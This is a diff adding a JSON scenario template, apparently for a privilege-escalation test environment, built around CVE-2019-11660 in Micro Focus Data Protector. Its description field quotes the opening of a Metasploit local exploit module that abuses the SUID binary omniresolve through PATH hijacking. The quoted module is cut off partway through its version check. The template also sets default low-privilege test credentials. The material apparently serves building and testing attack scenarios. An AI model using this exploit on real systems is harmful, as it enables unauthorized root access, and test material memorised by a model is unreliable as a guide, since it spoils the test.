@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47580",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Micro Focus (HPE) Data Protector - SUID Privilege Escalation (Metasploit) (CVE-2019-11660)\n\nExploit source code (47580.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Micro Focus (HPE) Data Protector SUID Privilege Escalation',\n      'Description'    => %q{\n        This module exploits the trusted `$PATH` environment\n        variable of the SUID binary `omniresolve` in\n        Micro Focus (HPE) Data Protector A.10.40 and prior.\n\n        The `omniresolve` executable calls the `oracleasm` binary using\n        a relative path and the trusted environment `$PATH`, which allows\n        an attacker to execute a custom binary with `root` privileges.\n\n        This module has been successfully tested on:\n        HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016;\n        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core)\n\n        The vulnerability has been patched in:\n        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          's7u55', # Discovery and Metasploit module\n        ],\n      'DisclosureDate' => '2019-09-13',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        =>\n        [\n          [\n            'Micro Focus (HPE) Data Protector <= 10.40 build 118',\n            upper_version: Gem::Version.new('10.40')\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'PrependSetgid' => true,\n          'PrependSetuid' => true\n        },\n      'References'     =>\n        [\n          [ 'CVE', '2019-11660' ],\n          [ 'URL', 'https://softwaresupport.softwaregrp.com/doc/KM03525630' ]\n        ]\n    ))\n\n    register_options(\n      [\n        OptString.new('SUID_PATH', [ true, 'Path to suid executable omniresolve', '/opt/omni/lbin/omniresolve' ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ForceExploit', [ false, 'Override check result', false ]),\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def suid_bin_path\n    datastore['SUID_PATH'].to_s\n  end\n\n  def check\n    unless setuid? suid_bin_path\n      vprint_error(\"#{suid_bin_path} executable is not setuid\")\n      return CheckCode::Safe\n    end\n\n    info = cmd_exec(\"#{suid_bin_path} -ver\").to_s\n    if info =~ /(?<=\\w\\.)(\\d\\d\\.\\d\\d)(.*)(?<=build )(\\d\\d\\d)/\n      version = '%.2f' % $1.to_f\n\n```",
+  "cve": "CVE-2019-11660",
+  "exploitdb_id": "47580",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47580",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
